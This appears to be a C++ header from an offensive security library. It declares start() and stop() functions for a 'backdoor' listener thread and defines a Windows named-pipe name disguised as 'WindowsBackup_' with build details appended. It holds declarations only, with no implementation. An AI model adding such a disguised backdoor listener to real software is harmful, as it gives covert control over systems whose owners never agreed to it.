#pragma once

#include "common.hpp"

#ifdef __PWNLIB_WINDOWS_BUILD__
#define PWN_BACKDOOR_PIPENAME L"\\\\.\\pipe\\WindowsBackup_" STR(__STDC_VERSION) L"_" STR(__TIME__)
#define PWN_BACKDOOR_MAX_MESSAGE_SIZE 2048
#else
#error "todo: backdoor for linux"
#endif

///
/// @brief Interface for the backdoor
///
///
namespace pwn::backdoor
{

///
/// @brief Start the backdoor thread
///
/// @return the thread id of the listening thread on success; an Error() otherwise
///
Result<u32> PWNAPI
start();


///
/// @brief Cleanly stop the backdoor
///
/// @return Ok() on success, Error() on error
///
Result<bool> PWNAPI
stop();

}; // namespace pwn::backdoor
